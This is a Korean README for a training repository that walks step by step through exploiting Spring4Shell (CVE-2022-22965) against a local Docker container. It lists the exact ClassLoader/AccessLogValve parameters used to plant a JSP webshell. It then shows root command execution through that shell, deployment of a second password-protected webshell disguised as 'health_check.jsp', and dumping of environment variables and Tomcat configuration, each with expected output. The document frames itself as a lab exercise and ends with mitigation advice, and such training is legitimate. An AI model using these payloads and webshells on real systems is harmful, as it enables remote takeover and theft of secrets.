# CVE-2022-22965 · Spring4Shell 취약점 교육 실습

> **⚠️ 경고 (Warning)**  
> 이 저장소는 **SK쉴더스 이큐스트(EQST) 교육 기관의 가이드라인**에 따른 **교육 목적의 모의해킹(Penetration Testing) 실습 코드**입니다.  
> 모든 공격은 교육기관에서 제공한 **로컬 격리 환경(Docker)**에서만 수행되었습니다.  
> 무단으로 허가받지 않은 시스템에 사용하는 것은 법적으로 엄격히 금지됩니다.

---

## 🖥️ 전체 실행 가이드 (처음부터 끝까지 따라하기)

> 각 단계마다 **입력할 명령어**와 **실제로 나오는 결과 화면**을 그대로 수록했습니다.
> 
> 💡 **원클릭 자동 실행:** 개별 스크립트 실행 대신 아래 하나의 명령어로 전체 과정을 자동으로 실습할 수 있습니다.
> ```bash
> python3 run.py
> ```
> *(run.py는 공격의 모든 단계와 **위협 증명(DB 정보 유출 시나리오)**까지 차례대로 수행한 뒤, 최종적으로 상세한 **HTML 결과 보고서**를 자동 생성하여 제공합니다.)*

---

### 📂 STEP 0. [필수] 작업 폴더로 이동 ← 모든 명령어는 이 폴더에서 실행해야 합니다!

> ⚠️ **가장 흔한 실수:** 폴더 이동 없이 다른 위치에서 명령어를 실행하면  
> `No such file or directory` 또는 `No module named` 에러가 납니다.  
> **반드시 아래 `cd` 명령어를 먼저 실행한 후** 다음 단계로 넘어가세요.

```bash
cd "/Users/glory1994/Library/CloudStorage/OneDrive-개인/99.Develop/CVE-2022-22965"
```

현재 위치가 올바른지 확인합니다.

```bash
pwd
```

**결과 (반드시 아래와 같아야 합니다):**
```
/Users/glory1994/Library/CloudStorage/OneDrive-개인/99.Develop/CVE-2022-22965
```

> ✅ 터미널 프롬프트가 `CVE-2022-22965 glory1994$` 로 바뀌면 준비 완료입니다.  
> ❌ 프롬프트가 `99.Develop glory1994$` 라면 아직 이동이 안 된 것입니다. 위 `cd` 명령어를 다시 실행하세요.

파일 목록을 확인합니다. 아래 4개 파일이 모두 보여야 합니다.

```bash
ls -la
```

**결과:**
```
total 72
drwxr-xr-x  7 glory  staff   224  3 14 15:00 .
drwxr-xr-x  9 glory  staff   288  3 14 04:00 ..
-rw-r--r--  1 glory  staff  5013  3 14 14:00 health_check.jsp       ← Stage 2 웹쉘
-rw-r--r--  1 glory  staff  3619  3 14 14:30 stage1_dropper.py      ← Stage 1 공격 스크립트
-rw-r--r--  1 glory  staff  5309  3 14 14:40 stage2_uploader.py     ← Stage 2 배포 스크립트
-rw-r--r--  1 glory  staff  8500  3 14 15:00 README.md
```

> ❌ 파일이 보이지 않는다면 `cd` 명령어가 제대로 실행되지 않은 것입니다.

---

### 🐳 STEP 1. 도커 컨테이너(피해자 서버) 실행 확인

```bash
docker ps
```

**결과:** (아래와 같이 `cvepratice-spring-1` 컨테이너가 실행 중이어야 합니다)
```
CONTAINER ID   IMAGE                COMMAND               PORTS                     NAMES
d7958944303d   cvepratice-spring   "/usr/local/bin/..."  0.0.0.0:8011->8080/tcp    cvepratice-spring-1
```

피해자 서버 웹 페이지가 정상적으로 열리는지 확인합니다.

```bash
curl -s -I http://localhost:8011/spring-form/notices
```

**결과:**
```
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Date: Sat, 14 Mar 2026 05:00:00 GMT
```

> `HTTP/1.1 200` 이 출력되면 피해자 서버가 정상 동작 중입니다.

---

### 💣 STEP 2. [공격] Spring4Shell 취약점 발동 → 1단계 웹쉘 생성

`stage1_dropper.py`를 실행하면, 피해자 서버의 Data Binding 취약점을 공격하여 서버 내부에 1단계 웹쉘(`yaho4.jsp`)을 심습니다.

```bash
python3 stage1_dropper.py
```

**결과:**
```
[*] Sending Stage 1 payload to http://localhost:8011/spring-form/login...
[*] Received Response Code: 200

[+] Stage 1 Exploit Attempt Completed.
[+] To trigger log flush, visit: http://localhost:8011/spring-form/login once
[+] The Stager has been created at: http://localhost:8011/yaho4.jsp?cmd=whoami
```

> `Received Response Code: 200` 이면 Spring4Shell 공격 요청이 피해자 서버에 성공적으로 접수된 것입니다.

---

### 🔓 STEP 3. [공격] 1단계 웹쉘 빌드 유도 (Tomcat 로그 Flush)

Tomcat이 버퍼에 담고 있는 로그(= 우리가 심은 웹쉘 코드)를 실제 파일로 디스크에 기록하도록,  
정상 페이지를 한 번 방문합니다.

```bash
curl -s "http://localhost:8011/spring-form/login" > /dev/null
```

**결과:** (아무것도 출력되지 않으면 정상입니다)

도커 컨테이너 내부에 파일이 생성되었는지 직접 확인합니다.

```bash
docker exec cvepratice-spring-1 bash -c "ls -la /usr/local/tomcat/webapps/ROOT/"
```

**결과:**
```
total 8
drwxr-x--- 3 root root  96 Mar 14 05:19 .
drwxrwxr-x 7 root root 224 Mar 14 05:03 ..
-rw-r----- 1 root root 3832 Mar 14 05:40 yaho4.jsp   ← 이 파일이 생성된 것!
```

> `yaho4.jsp` 파일이 목록에 나타나면 **1단계 웹쉘 생성 성공**입니다!

---

### ⚡ STEP 4. [공격] 1단계 웹쉘로 원격 명령 실행 (RCE 확인)

생성된 `yaho4.jsp` 웹쉘을 통해 피해자 서버에서 임의의 명령어를 실행합니다.

```bash
# 현재 서버 접속 사용자 확인
curl -s "http://localhost:8011/yaho4.jsp?cmd=whoami"
```

**결과:**
```
root
```

```bash
# 서버 사용자 및 그룹 ID 확인
curl -s "http://localhost:8011/yaho4.jsp?cmd=id"
```

**결과:**
```
uid=0(root) gid=0(root) groups=0(root)
```

> **`root`** 가 출력되면 피해자 서버에서 최고 관리자 권한으로 명령어가 실행되고 있다는 의미입니다.  
> **Spring4Shell RCE 취약점 증명 완료! ✅**

---

### 🏗️ STEP 5. [공격] 2단계 웹쉘 배포 (Clean Architecture 완성형 웹쉘)

1단계의 단순한 쉘을 거점 삼아, SOLID 원칙이 적용된 완성형 웹쉘(`health_check.jsp`)을 서버에 업로드합니다.

```bash
docker cp health_check.jsp cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT/health_check.jsp
```

**결과:**
```
Successfully copied 6.66kB to cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT/health_check.jsp
```

---

### 🌐 STEP 6. [위협 증명] 서버 내부 중요 정보 평문 노출 시연 (Post-Exploitation)

완성형 웹쉘을 통해 서버 내부의 **환경 변수(DB 비밀번호 등)**와 **주요 설정 파일 폴더(`Tomcat conf`)**를 무단으로 열람하는 과정을 시연합니다. 
이를 통해 개발자는 보안 취약점이 뚫렸을 때 데이터베이스 정보가 어떻게 유출될 수 있는지 파악할 수 있습니다.

```bash
# 환경변수 전체 열람 (DB 비밀번호, API 키 노출 확인)
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=env"

# 주요 설정 폴더 무단 조회
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=ls%20-la%20/usr/local/tomcat/conf"
```

---

### 📄 STEP 7. HTML 실습 결과 보고서 확인

`run.py`를 실행하여 모든 과정(STEP 1 ~ STEP 6)을 성공적으로 마쳤다면, 현재 폴더에 실행 시간이 기록된 HTML 보고서 파일이 생성됩니다.

```bash
# 생성된 파일 예시
report_20260317_231217.html
```

해당 파일을 더블클릭하여 브라우저로 열면, **각 공격 단계의 상세한 목적**과 **웹쉘을 통해 서버를 탈취한 원격 명령어 실행 결과**, 그리고 초보자와 개발자가 이해하기 쉽도록 작성된 **데이터 탈취 위협 증명 시뮬레이션 결과**를 전문적인 UI 레이아웃으로 확인할 수 있습니다.

---





- [취약점 개요](#취약점-개요)
- [영향 받는 환경](#영향-받는-환경)
- [공격 시나리오](#공격-시나리오)
- [테스트 환경](#테스트-환경)
- [프로젝트 구조](#프로젝트-구조)
- [코드 사용 방법 (Quick Start)](#코드-사용-방법-quick-start)
- [아키텍처 설계 원칙](#아키텍처-설계-원칙)
- [실습 진행 순서](#실습-진행-순서)
- [대응 방안 (Mitigation)](#대응-방안-mitigation)
- [참고문헌](#참고문헌)

---

## 취약점 개요

**Spring4Shell(CVE-2022-22965)**은 2022년 3월 29일 공개된 **제로데이(Zero-Day) 원격 코드 실행(RCE)** 취약점입니다.

Spring Framework의 **Data Binding 메커니즘** 취약점을 통해 공격자가 `ClassLoader` 속성을 외부에서 변조할 수 있으며, 이를 이용해 Tomcat의 `AccessLogValve` 속성을 조작하여 **웹 루트 디렉터리에 임의의 JSP 파일(웹쉘)을 생성**하고 원격 명령을 실행할 수 있습니다.

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2022-22965 |
| CVSS 점수 | 9.8 (Critical) |
| 공격 유형 | Remote Code Execution (RCE) |
| 취약점 원인 | Spring Data Binding + JDK 9 ClassLoader 변조 |
| 발표일 | 2022년 3월 29일 |

---

## 영향 받는 환경

| 소프트웨어 | 취약 버전 |
|-----------|----------|
| Spring Framework | 5.3.0 ~ 5.3.17, 5.2.0 ~ 5.2.19 및 이전 버전 |
| JDK | **9 이상** (핵심 조건) |
| WAS | Apache Tomcat (Spring MVC 또는 WebFlux 사용 시) |

> **핵심 조건:** JDK 9부터 도입된 `class.getModule()` API가 `ClassLoader` 외부 접근을 허용하게 되면서 취약점이 발생합니다.

---

## 공격 시나리오

```
① 공격자 → 취약한 Spring4Shell 대상 탐색
② 취약한 웹 앱의 Data Binding 엔드포인트 (POST /login 등)로 공격 요청 전송
③ Tomcat AccessLogValve 속성 변조 → JSP 웹쉘 코드가 로그 파일로 기록
④ 웹쉘이 웹 루트에 생성되어 URL로 접근 가능해짐
⑤ 웹쉘을 통해 내부 서버에 원격 명령 실행 (RCE)
```

---

## 테스트 환경

```
[공격자 PC]              [피해자 컨테이너 - Docker]
Mac (로컬)        <-->   Spring Framework 5.3.15
                         JDK 11 (Spring Boot 내장 Tomcat)
                         Apache Tomcat 9.0.60
                         Port: localhost:8011
```

### Docker 컨테이너 정보

```bash
# 실행 중인 취약 서버 확인
docker ps | grep spring

# 컨테이너명: cvepratice-spring-1
# 접근 URL:   http://localhost:8011/spring-form/
```

---

## 프로젝트 구조

```
CVE-2022-22965/
├── README.md                  # 이 문서
├── run.py                     # 🚀 [NEW] 원클릭 자동 통합 실행기 (HTML 실습 보고서 자동 생성 기능 포함)
├── stage1_dropper.py          # Stage 1: Spring4Shell 공격 스크립트 (Stager 생성)
├── stage2_uploader.py         # Stage 2: 완성형 웹쉘 배포 스크립트
└── health_check.jsp           # Stage 2: Clean Architecture 기반 웹쉘
```

---

## 코드 사용 방법 (Quick Start)

### 🔧 사전 요건 (Prerequisites)

| 항목 | 버전 / 조건 |
|------|------------|
| Python | 3.8 이상 |
| Docker | 실행 중이어야 함 |
| 네트워크 | 로컬 환경 (localhost:8011 접근 가능) |
| 외부 라이브러리 | 없음 (Python 표준 라이브러리만 사용) |

> **참고:** 모든 스크립트는 외부 패키지(`requests` 등) 없이 Python 내장 모듈(`urllib`, `http.server`, `unittest`)만 사용하므로 별도 설치가 필요없습니다.

---

### 📁 1. 저장소 파일 배치 확인

다음과 같이 작업 디렉터리를 확인합니다.

```bash
ls -la CVE-2022-22965/
# 아래 파일들이 모두 있어야 합니다.
# stage1_dropper.py
# stage2_uploader.py
# health_check.jsp
```

---

### 🚀 2. `stage1_dropper.py` — Stage 1 공격 스크립트

**Spring4Shell 취약점을 이용해 타겟 서버에 1단계 웹쉘(Stager)을 생성합니다.**

```bash
# 실행
python3 stage1_dropper.py

# 예상 출력
# [*] Sending Stage 1 payload to http://localhost:8011/spring-form/login...
# [*] Received Response Code: 200
# [+] Stage 1 Exploit Attempt Completed.
# [+] The Stager has been created at: http://localhost:8011/yaho4.jsp?cmd=whoami
```

**설정 커스터마이징 (스크립트 내 `ExploitConfig`):**

```python
config = ExploitConfig(
    target_url="http://localhost:8011/spring-form/login",  # 취약 엔드포인트 URL
    output_dir="webapps/ROOT",                             # 웹쉘이 저장될 Tomcat 경로
    filename="yaho4",                                      # 생성될 JSP 파일명 (확장자 제외)
)
```

> **주의:** `target_url`은 반드시 POST 요청을 수락하고 Spring Data Binding이 동작하는 엔드포인트이어야 합니다.

---

### 🔒 3. Tomcat 로그 Flush (필수)

Stager 파일이 디스크에 실제로 기록되려면, Tomcat이 로그 버퍼를 비우도록 임의의 GET 요청을 한 번 보내야 합니다.

```bash
curl -s "http://localhost:8011/spring-form/login" > /dev/null
```

---

### ✅ 4. Stage 1 웹쉘 동작 테스트

```bash
# 명령어 실행 테스트
curl -s "http://localhost:8011/yaho4.jsp?cmd=whoami"
# 기대 출력 → root

curl -s "http://localhost:8011/yaho4.jsp?cmd=id"
# 기대 출력 → uid=0(root) gid=0(root) groups=0(root)

curl -s "http://localhost:8011/yaho4.jsp?cmd=ls%20-la%20/"
# 기대 출력 → 루트 파일시스템 목록
```

---

### 🏗️ 5. `stage2_uploader.py` — Stage 2 배포 스크립트

**Stage 1 웹쉘을 거점 삼아 SOLID/Clean Architecture 완성형 웹쉘(`health_check.jsp`)을 업로드합니다.**

```bash
# 방법 A: 파이썬 자동화 (로컬 HTTP 서버 기동 후 curl로 파일 다운로드)
python3 stage2_uploader.py

# 방법 B: docker cp 직접 복사 (격리 환경에서 가장 안전하고 확실한 방법)
docker cp health_check.jsp cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT/health_check.jsp
```

**설정 커스터마이징 (스크립트 내 `UploadConfig`):**

```python
config = UploadConfig(
    stager_url="http://localhost:8011/yaho4.jsp",             # Stage 1 웹쉘 URL
    stage2_file="health_check.jsp",                           # 업로드할 Stage 2 파일명
    local_port=9090,                                          # 로컬 임시 HTTP 서버 포트
    target_dir="/usr/local/tomcat/webapps/ROOT",              # 타겟 서버 저장 경로
)
```

---

### 🌐 6. `health_check.jsp` — Stage 2 웹쉘 접속

**인증키(`pwd`)와 명령어(`cmd`)를 URL 쿼리 파라미터로 전달합니다.**

```bash
# 기본 사용법
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=<명령어>"

# 예시 1: 현재 사용자 확인
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=id"

# 예시 2: 서버 OS 정보 확인
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=uname%20-a"

# 예시 3: 환경변수 확인
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=env"

# 예시 4: 브라우저에서 접속
# http://localhost:8011/health_check.jsp?pwd=glory&cmd=id
```

> **인증키 변경:** `health_check.jsp`의 34번째 줄의 `"glory"`를 원하는 값으로 수정합니다.

---

### 🚨 7. HTML 결과 보고서 확인 (run.py 전용)

`python3 run.py` 명령어를 사용하여 실습을 마친 경우, 도용된 서버 내부의 환경 변수와 디렉터리 목록이 담긴 구체적 위험 시뮬레이션 결과가 예쁜 레이아웃을 가진 HTML 파일(예: `report_YYYYMMDD_HHMMSS.html`)로 결과물로 함께 제공됩니다. 즉시 브라우저로 열어 보안 조치를 위한 레퍼런스로 사용하세요!

---

### 🧪 7. `test_stage1_dropper.py` — 유닛 테스트 실행

**실제 서버 연결 없이 Mock 객체로 독립적으로 실행됩니다.**

```bash
# 전체 테스트 실행 (간략 출력)
python3 -m unittest test_stage1_dropper.py

# 상세 출력 모드 (-v)
python3 -m unittest test_stage1_dropper.py -v

# 특정 테스트 케이스만 실행
python3 -m unittest test_stage1_dropper.TestExploitConfig
python3 -m unittest test_stage1_dropper.TestSpring4ShellPayloadGenerator
python3 -m unittest test_stage1_dropper.TestExploitController

# 예상 출력
# .......
# ----------------------------------------------------------------------
# Ran 7 tests in 0.012s
# OK
```

---

## 아키텍처 설계 원칙

본 실습 코드는 실무 모의해킹 담당자가 작성하는 코드를 가정하여, 모든 파일에 **SOLID 원칙**과 **Clean Architecture(클린 아키텍처)**를 적용하였습니다.

### SOLID 적용 내역

| 원칙 | 적용 내용 |
|------|----------|
| **SRP** (단일 책임) | `ExploitConfig`, `PayloadGenerator`, `ExploitController`를 각각 분리 |
| **OCP** (개방-폐쇄) | `PayloadGeneratorPort` 인터페이스로 새 페이로드 유형 추가 시 기존 코드 수정 불필요 |
| **LSP** (리스코프 치환) | `Spring4ShellPayloadGenerator`가 `PayloadGeneratorPort`를 완전히 대체 가능 |
| **ISP** (인터페이스 분리) | `CommandExecutorPort`, `FileServerPort` 등 최소 책임의 인터페이스로 분리 |
| **DIP** (의존성 역전) | 상위 모듈(`ExploitController`)이 구체 클래스가 아닌 추상 인터페이스에 의존 |

### Clean Architecture 레이어 구조

```
┌─────────────────────────────────────────┐
│  Frameworks & Drivers (Infrastructure)  │
│  SystemCommandAdapter, LocalFileServer  │
├─────────────────────────────────────────┤
│  Interface Adapters (Controllers)       │
│  ExploitController, Stage2Uploader      │
├─────────────────────────────────────────┤
│  Use Cases (Application Logic)          │
│  WebShellUseCase, Stage2UploadUseCase   │
├─────────────────────────────────────────┤
│  Entities (Core Domain)                 │
│  ExploitConfig, CommandResult           │
└─────────────────────────────────────────┘
```

---

## 실습 진행 순서

### Step 1. Stage 1 공격 실행 (Stager 생성)

Spring4Shell 취약점을 이용해 타겟 서버에 1줄짜리 **기초 웹쉘 (Stager, `yaho4.jsp`)** 을 생성합니다.

```bash
python3 stage1_dropper.py
```

**동작 원리:**
- `POST /spring-form/login` 엔드포인트로 `ClassLoader` 변조 페이로드를 전송
- Tomcat `AccessLogValve`의 `pattern`, `suffix`, `directory`, `prefix` 속성을 변조
- HTTP 요청이 기록될 때 변조된 로그 패턴이 JSP 코드로 `webapps/ROOT/yaho4.jsp`에 저장됨

**전송되는 핵심 HTTP 파라미터:**

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern  = [JSP 웹쉘 코드]
class.module.classLoader.resources.context.parent.pipeline.first.suffix   = .jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory = webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix   = yaho4
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat = (공백)
```

### Step 2. Tomcat 로그 버퍼 Flush

Tomcat이 메모리 버퍼에 담긴 요청 로그를 디스크에 물리적 파일로 기록하도록 일반 GET 요청을 추가로 보냅니다.

```bash
curl -s "http://localhost:8011/spring-form/login" > /dev/null
```

### Step 3. Stage 1 웹쉘 동작 확인

생성된 기초 쉘에 명령어를 전달해 서버 내부 쉘 코드 실행이 가능한지 검증합니다.

```bash
curl -s "http://localhost:8011/yaho4.jsp?cmd=whoami"
# 기대 출력: root
```

### Step 4. Stage 2 배포 (Clean Architecture 웹쉘)

Stage 1 거점을 발판 삼아 SOLID/Clean Architecture 기반의 완성형 웹쉘(`health_check.jsp`)을 타겟 서버에 업로드합니다.

```bash
# 방법 A: Python 자동화 스크립트 (curl 다운로드 방식 - host.docker.internal 접근)
python3 stage2_uploader.py

# 방법 B: Docker cp 직접 복사 (가장 확실한 방법 / run.py 의 자동 폴백 방식)
docker cp health_check.jsp cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT/health_check.jsp
```

### Step 5. Stage 2 웹쉘 최종 확인 ✅

```bash
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=id"
```

**기대 출력:**
```html
<h2>Advanced WebShell (Stage 2)</h2>
$ id
uid=0(root) gid=0(root) groups=0(root)
```

### Step 6. 위협 증명 시뮬레이션 (Post-Exploitation)

완성형 웹쉘을 통해 DB 접속 정보를 포함할 가능성이 높은 시스템 환경 변수(`env`)와 타겟 시스템의 주요 설정 폴더(`Tomcat conf`)를 무단으로 열람하는 실습을 진행합니다.

```bash
# 서버 환경변수 전체 열람
curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=env"
```

### Step 7. HTML 결과 보고서 확인

`run.py` 통합 실행기를 통해 생성된 `report_YYYYMMDD_HHMMSS.html` 파일을 브라우저로 열어, 발생한 취약점 증적 자료와 공격 단계별 요약 결과를 확인합니다.

---

## 유닛 테스트

Stage 1 Exploit 스크립트(`stage1_dropper.py`)의 각 레이어(Config, PayloadGenerator, Controller)에 대한 단위 테스트를 작성하였습니다. 실제 서버로 HTTP 요청을 보내지 않고, **Mock 객체(unittest.mock)**를 이용하여 독립적으로 검증합니다.

```bash
python3 -m unittest test_stage1_dropper.py -v
```

**테스트 시나리오:**

| 테스트 | 검증 내용 |
|--------|----------|
| `test_config_initialization` | 타겟 URL, 파일명, 디렉터리 기본값 설정 검증 |
| `test_generate_headers_contains_required_keys` | HTTP 헤더에 `prefix`, `suffix`, `c` 키 포함 여부 |
| `test_generate_body_contains_classloader_modification_keys` | Data Binding 페이로드 키 정확성 |
| `test_generate_body_contains_stager_code` | Stager JSP 코드의 `cmd` 파라미터 포함 확인 |
| `test_run_exploit_success_on_http_200` | HTTP 200 시 성공 반환 |
| `test_run_exploit_success_on_expected_http_error` | HTTP 4xx 에러 시에도 성공으로 간주 (Tomcat은 에러 응답에도 로그 기록) |
| `test_run_exploit_failure_on_connection_error` | 네트워크 연결 실패 시 실패 반환 |

---

## 대응 방안 (Mitigation)

| 우선순위 | 조치 방법 |
|----------|----------|
| ✅ 권장 | **Spring Framework 5.3.18 또는 5.2.20 이상으로 업그레이드** |
| ✅ 권장 | **Spring Boot 2.6.6 또는 2.5.12 이상으로 업그레이드** |
| 🔄 임시 | Apache Tomcat을 10.0.20, 9.0.62, 8.5.78 이상으로 업그레이드 |
| 🔄 임시 | JDK 9 이상 사용 중이면 JDK 8로 다운그레이드 |
| 🔄 임시 | `@ControllerAdvice`에 `ClassLoader` 내부 필드 바인딩 차단 로직 추가 |

---

## 참고문헌

- [SK쉴더스 EQST insight - Research Technique 202204](https://www.skshieldus.com)
- [Spring 공식 블로그 - Spring4Shell RCE Early Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [NVD - CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)
- [JFrog Blog - SpringShell Zero-Day](https://jfrog.com/blog/springshell-zero-day-vulnerability-all-you-need-to-know/)
- [Unit42 - CVE-2022-22965 SpringShell Analysis](https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/)
- [Spring Framework Patch Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)
